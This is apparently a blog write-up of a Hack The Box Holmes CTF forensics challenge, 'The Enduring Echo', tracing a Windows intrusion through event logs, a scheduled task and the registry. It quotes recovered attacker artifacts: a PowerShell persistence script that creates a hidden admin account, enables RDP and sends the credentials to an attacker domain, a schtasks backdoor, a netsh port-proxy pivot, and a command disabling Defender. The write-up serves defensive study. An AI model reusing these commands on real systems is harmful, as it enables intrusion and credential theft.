---
title: "Hack The Box: Holmes CTF 2025 - The Enduring Echo"
date: 2025-09-28
categories: [Hack The Box]
tags: [Hack The Box, CTF, Blue Team, Digital Forensics, Log Analysis, Investigation, Threat Intelligence, IOCs, Threat Hunting]
image:
  path: /assets/img/hack-the-box/holmes-ctf-2025/holmes-ctf-2025-main.jpg
---

# Hack The Box: Holmes CTF 2025 - The Enduring Echo

## Overview

This is the second challenge in the Hack The Box Holmes CTF 2025. This one is called The Enduring Echo. I am exicited to dive into this challenge, it is an infected machine. In this challenge I will use a tool by the one and only Eric Zimmerman. Another good tool to use is called Velociraptor for DFIR investigations.

## Description

LeStrade passes a disk image artifacts to Watson. It's one of the identified breach points, now showing abnormal CPU activity and anomalies in process logs.

## Question 1, 2, and 3

Question 1: What was the first (non cd) command executed by the attacker on the host? (string)
Question 2: Which parent process (full path) spawned the attacker’s commands? (C:\FOLDER\PATH\FILE.ext)
Question 3: Which remote-execution tool was most likely used for the attack? (filename.ext)

To start, I decided to use Eric Zimmerman's EvtxECmd.exe tool to parse the event logs and check for Windows Security Event ID 4688. Why do EventId 4688? Because this event allows us to observe the Process Command Line information for this particular event.

```powershell
EvtxECmd.exe -d "The_Enduring_Echo\The_Enduring_Echo\C\Windows\System32\winevt\logs" --csv . --csvf evtx.csv
```

I viewed the parsed CSV file using Timeline Explorer, then filtered for Event ID 4688 and searched for "cmd" in the search box. I observed a remote execution process where WmiPrvSE.exe spawned cmd.exe to execute remote commands. The first command was "cd", followed by "systeminfo". Based on this activity, we conclude that the attacker was using the wmiexec.py tool for remote execution on the system.

In the file we can see that the first non cd command ran was `systeminfo`. The parent process that spawned the cmd.exe, which should never do this in a normal environment, was `C:\Windows\System32\wbem\WmiPrvSE.exe`. The remote tool that was most likely used for the attack was `wmiexec.py`.

![Image](/assets/img/hack-the-box/holmes-ctf-2025/the-enduring-echo/the_enduring_echo_question_3.png)

## Question 4

Question 4: What was the attacker’s IP address? (IPv4 address)

I reviewed additional commands executed by the attacker and observed that, on 2025-08-24 23:00:15.2002604, the attacker added his IP address as a domain entry to the hosts file.

``` console
C:\Windows\System32\cmd.exe cmd.exe /Q /c cmd /C "echo 10.129.242.110 NapoleonsBlackPearl.htb &gt;&gt; C:\Windows\System32\drivers\etc\hosts" 1&gt; \\127.0.0.1\ADMIN$\__1756075857.955773 2&gt;&amp;1
```
![Image](/assets/img/hack-the-box/holmes-ctf-2025/the-enduring-echo/the_enduring_echo_question_4.png)

## Question 5 & 6

Question 5: What is the first element in the attacker's sequence of persistence mechanisms? (string)

Question 6: Identify the script executed by the persistence mechanism. (C:\FOLDER\PATH\FILE.ext)

I reviewed additional commands executed by the attacker and observed that, on 2025-08-24 23:03:50.2566689, the attacker established persistence by creating a scheduled task to execute the JM.ps1 file located at C:\Users\Werni\AppData\Local. Threat actors love to establish persistence with scheduled tasks to execute code when least expecting or even when a certain event occurs, like system startup.

``` console
C:\Windows\System32\cmd.exe cmd.exe /Q /c schtasks /create /tn "SysHelper Update" /tr "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Werni\Appdata\Local\JM.ps1" /sc minute /mo 2 /ru SYSTEM /f 1&gt; \\127.0.0.1\ADMIN$\__1756076432.886685 2&gt;&amp;1
```
![Image](/assets/img/hack-the-box/holmes-ctf-2025/the-enduring-echo/the_enduring_echo_question_5_6.png)

## Question 7

Question 7: What local account did the attacker create? (string)

I filtered for Windows Security Event ID 4720: A user account was created and observed that the user svc_netupd was created at 23:05:09.7646587 on 2025-08-24. The attacker entered the system around 2025-08-20 and this was the only account created so far.

![Image](/assets/img/hack-the-box/holmes-ctf-2025/the-enduring-echo/the_enduring_echo_question_7.png)

## Question 8

Question 8: What domain name did the attacker use for credential exfiltration? (domain)

We examined the persistence PowerShell script JM.ps1, located at The_Enduring_Echo\The_Enduring_Echo\C\Users\Werni\AppData\Local\JM.ps1. The attacker used this script to select a username from a predefined array, generate a password based on the execution timestamp, create the account, and send the credentials to the attacker-controlled domain NapoleonsBlackPearl.htb.

```console
# List of potential usernames
$usernames = @("svc_netupd", "svc_dns", "sys_helper", "WinTelemetry", "UpdaterSvc")

# Check for existing user
$existing = $usernames | Where-Object {
    Get-LocalUser -Name $_ -ErrorAction SilentlyContinue
}

# If none exist, create a new one
if (-not $existing) {
    $newUser = Get-Random -InputObject $usernames
    $timestamp = (Get-Date).ToString("yyyyMMddHHmmss")
    $password = "Watson_$timestamp"

    $securePass = ConvertTo-SecureString $password -AsPlainText -Force

    New-LocalUser -Name $newUser -Password $securePass -FullName "Windows Update Helper" -Description "System-managed service account"
    Add-LocalGroupMember -Group "Administrators" -Member $newUser
    Add-LocalGroupMember -Group "Remote Desktop Users" -Member $newUser

    # Enable RDP
    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
    Invoke-WebRequest -Uri "http://NapoleonsBlackPearl.htb/Exchange?data=$([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("$newUser|$password")))" -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
}
```

## Question 9

Question 9: What password did the attacker's script generate for the newly created user? (string)

Based on question 7, we know the user `svc_netupd` was created at 23:05:09.7646587 on 2025-08-24. The expected password format would be Watson_20250824230509, but because of UTC/local time differences we must be careful. This challenge really kept me on my toes with time sync and making sure I was using the right time to show accurate result. Fortunately, the scheduled task created by the attacker still exists, so we inspected the task file at The_Enduring_Echo\The_Enduring_Echo\C\Windows\System32\Tasks\SysHelper Update. The attacker configured the task to execute the script at local time 2025-08-24T16:03:00 with a 2‑minute interval. Therefore the actual password is Watson_20250824160509.

```console
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2025-08-24T16:03:50</Date>
    <Author>HEISEN-9-WS-6\Werni</Author>
    <URI>\SysHelper Update</URI>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <Repetition>
        <Interval>PT2M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2025-08-24T16:03:00</StartBoundary>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <Duration>PT10M</Duration>
      <WaitTimeout>PT1H</WaitTimeout>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>powershell</Command>
      <Arguments>-ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Werni\Appdata\Local\JM.ps1</Arguments>
    </Exec>
  </Actions>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
</Task>
```

## Question 10, 11, 12, and 13

Question 10: What was the IP address of the internal system the attacker pivoted to? (IPv4 address)

Question 11: Which TCP port on the victim was forwarded to enable the pivot? (port 0-65565)

Question 12: What is the full registry path that stores persistent IPv4→IPv4 TCP listener-to-target mappings? (HKLM\...\...)

Question 13: What is the MITRE ATT&CK ID associated with the previous technique used by the attacker to pivot to the internal system? (Txxxx.xxx)

Next, I reviewed additional commands executed by the attacker and observed that, on 2025-08-24 23:10:05.6900692, they executed the proxy.bat file. This was followed by, on 2025-08-24 23:10:05.7722485, the creation of a TCP port forward on the Windows host — listening on all IPv4 addresses at local port 9999 and forwarding incoming TCP connections to 192.168.1.101:22 (through SSH). The attacker stored persistent IPv4→IPv4 TCP listener‑to‑target mappings at HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp. According to MITRE, this corresponds to `T1090.001 (Proxy: Internal Proxy)`. I used Eric Zimmerman's Registry Explorer to examine the registry keys and their values.

The proxy.bat file was executed with the following command:
```console
C:\Windows\System32\cmd.exe cmd.exe /Q /c .\proxy.bat 1&gt; \\127.0.0.1\ADMIN$\__1756076432.886685 2&gt;&amp;1
```

The script then added a persistent port proxy using this command:
```console
C:\Windows\System32\netsh.exe netsh  interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=192.168.1.101 connectport=22
```

![Image](/assets/img/hack-the-box/holmes-ctf-2025/the-enduring-echo/the_enduring_echo_question_proxy.png)
![Image](/assets/img/hack-the-box/holmes-ctf-2025/the-enduring-echo/the_enduring_echo_registry_hives.png)
![Image](/assets/img/hack-the-box/holmes-ctf-2025/the-enduring-echo/the_enduring_echo_mitre.png)

## Question 14

Question 14: Before the attack, the administrator configured Windows to capture command line details in the event logs. What command did they run to achieve this? (command)

This time I checked the PowerShell history file (ConsoleHost_history.txt) at The_Enduring_Echo\The_Enduring_Echo\C\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine and found commands related to enabling command‑line capture in the event logs.

```console
ipconfig
powershell New-NetIPAddress -InterfaceAlias "Ethernet0" -IPAddress 172.18.6.3 -PrefixLength 24
ipconfig.exe
powershell New-NetIPAddress -InterfaceAlias "Ethernet0" -IPAddress 10.129.233.246 -PrefixLength 24
ipconfig
ncpa.cpl
ipconfig
ping 1.1.1.1
cd C:\Users\
ls
net user Werni Quantum1! /add
ls
net localgroup administrator Werni /add
net localgroup Administrators Werni /add
clear
wmic computersystem where name="%COMPUTERNAME%" call rename name="Heisen-9-WS-6"
ls
cd ..
ls
cd .\Users\
ls
net users
Rename-Conputer -NewName "Heisen-9-WS-6" -Force
Rename-Computer -NewName "Heisen-9-WS-6" -Force
net users
ls
net user felamos /delete
cd ..
ls
net users
cat .\Werni\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
Enable-NetFirewallRule -DisplayGroup "Windows Management Instrumentation (WMI)"
Enable-NetFirewallRule -DisplayGroup "Remote Event Log Management"
Enable-NetFirewallRule -DisplayGroup "Remote Service Management"
auditpol /set /subcategory:"Process Creation" /success:enable
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f
Set-MpPreference -DisableRealtimeMonitoring $true
Get-MpComputerStatus | Select-Object AMRunningMode, RealTimeProtectionEnabled
```

## Conclusion

This challenge was fun. This challenge led me to the discovery of Eric Zimmerman's tools for Digital Forensics and Incident Response investigations. The tools make it easier to visualize the logs and make sense of what you are looking at. I want to eventually explore Velociraptor as it is a great tool for DFIR and many organizations use it for their official investigations. With that said, I learned more about scheduled tasks and what types of modifications they can make to the Windows Registry. I also explored a way an attacker can establish persistence on a machine with a scheduled task and making their own proxy entry in the Registry. The attacker also used the proxy as a listener to receive internet traffic. Next, I want to attempt the next level, Hack The Box: Holmes CTF 2025 - The Watchman's Residue.
